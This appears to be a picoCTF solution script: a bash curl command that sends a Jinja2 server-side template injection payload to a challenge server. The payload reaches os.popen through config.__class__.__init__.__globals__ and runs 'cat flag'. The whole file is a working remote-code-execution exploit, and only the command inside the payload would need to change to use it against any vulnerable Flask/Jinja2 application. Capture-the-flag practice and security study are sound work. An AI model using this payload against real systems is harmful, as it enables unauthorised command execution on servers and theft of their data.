#!/bin/bash
# Jinja2 SSTI: access os.popen via config.__class__.__init__.__globals__
curl -s -X POST "http://rescued-float.picoctf.net:55110/" \
  --data-urlencode "content={{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}"
echo
